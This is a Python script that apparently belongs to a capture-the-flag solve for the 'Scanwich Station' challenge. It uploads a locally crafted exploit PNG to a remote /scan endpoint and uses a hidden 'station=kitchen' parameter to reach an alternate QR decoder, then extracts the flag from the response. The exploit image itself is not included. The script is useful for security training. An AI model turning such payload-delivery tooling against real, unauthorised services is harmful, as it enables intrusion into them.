#!/usr/bin/env python3
"""
Remote runner for Scanwich Station.

Local PoC used Flask test_client():
    client.post('/scan?raw=1', data={'station':'kitchen', 'image': (...)} )

This script sends the same request to the real HTTPS service:
    POST https://host/scan?raw=1
    multipart/form-data:
      station=kitchen
      image=<PNG>

Usage:
  # sanity check: send a normal QR and confirm the hidden kitchen path is reachable
  python3 solve_scanwich_remote.py https://boiled-kimchi-atop-crispy-tomato-warp.gpn24.ctf.kitctf.de

  # send your final exploit PNG produced by the local solver/fuzzer
  python3 solve_scanwich_remote.py https://boiled-kimchi-atop-crispy-tomato-warp.gpn24.ctf.kitctf.de --image exploit.png

  # change QR text for debugging
  python3 solve_scanwich_remote.py https://boiled-kimchi-atop-crispy-tomato-warp.gpn24.ctf.kitctf.de --text ABC
"""

from __future__ import annotations

import argparse
import io
import re
import sys
from pathlib import Path
from urllib.parse import urljoin

import requests

FLAG_RE = re.compile(r"GPNCTF\{[^}\r\n]+\}")


def make_qr_png(text: str) -> bytes:
    """Generate a valid 8-bit greyscale PNG QR, matching the local kitchen PoC."""
    try:
        import qrcode
    except ImportError as exc:
        raise SystemExit(
            "Missing dependency: qrcode\n"
            "Install with: python3 -m pip install qrcode[pil] requests\n"
            "Or pass --image exploit.png to avoid QR generation."
        ) from exc

    img = qrcode.make(text).convert("L")
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return buf.getvalue()


def load_png(args: argparse.Namespace) -> tuple[bytes, str]:
    if args.image:
        path = Path(args.image)
        data = path.read_bytes()
        return data, path.name
    return make_qr_png(args.text), "ticket.png"


def post_scan(base_url: str, png_data: bytes, filename: str, timeout: float, verify_tls: bool) -> requests.Response:
    endpoint = urljoin(base_url.rstrip("/") + "/", "scan?raw=1")
    files = {
        "image": (filename, png_data, "image/png"),
    }
    data = {
        # This is the hidden switch found in local source review.
        # Without it the app uses guest_scan()/pyzbar instead of qrscan/quirc.
        "station": "kitchen",
    }
    return requests.post(endpoint, data=data, files=files, timeout=timeout, verify=verify_tls)


def main() -> int:
    ap = argparse.ArgumentParser(description="Send local Scanwich PNG payload to remote server")
    ap.add_argument("base_url", help="example: https://boiled-kimchi-atop-crispy-tomato-warp.gpn24.ctf.kitctf.de")
    ap.add_argument("--image", help="PNG payload generated/tested locally. If omitted, a normal QR sanity payload is generated.")
    ap.add_argument("--text", default="HELLO_FROM_KITCHEN", help="QR text for sanity mode; ignored when --image is used")
    ap.add_argument("--timeout", type=float, default=120.0)
    ap.add_argument("-k", "--insecure", action="store_true", help="disable TLS verification")
    ap.add_argument("--save-response", default="scanwich_remote_response.txt")
    args = ap.parse_args()

    png_data, filename = load_png(args)
    print(f"[+] target: {args.base_url.rstrip('/')}")
    print(f"[+] endpoint: /scan?raw=1")
    print(f"[+] mode: station=kitchen")
    print(f"[+] upload: {filename} ({len(png_data)} bytes)")

    try:
        r = post_scan(args.base_url, png_data, filename, args.timeout, not args.insecure)
    except requests.RequestException as exc:
        print(f"[-] request failed: {exc}", file=sys.stderr)
        return 2

    body = r.text
    Path(args.save_response).write_text(body, encoding="utf-8", errors="replace")

    print(f"[+] HTTP {r.status_code}")
    print(f"[+] response saved: {args.save_response}")
    print("----- response begin -----")
    print(body[:4000], end="" if body.endswith("\n") else "\n")
    if len(body) > 4000:
        print(f"... <truncated, total {len(body)} chars>")
    print("----- response end -----")

    flags = FLAG_RE.findall(body)
    if flags:
        print(f"[+] FLAG: {flags[0]}")
        return 0

    # Sanity mode success condition: server decoded our benign QR.
    if not args.image and args.text in body:
        print("[+] kitchen path confirmed on remote, but this was only the benign QR probe.")
        print("[!] no flag in response. Use --image with the final exploit PNG from the local solve.")
        return 1

    print("[-] no flag found in response")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
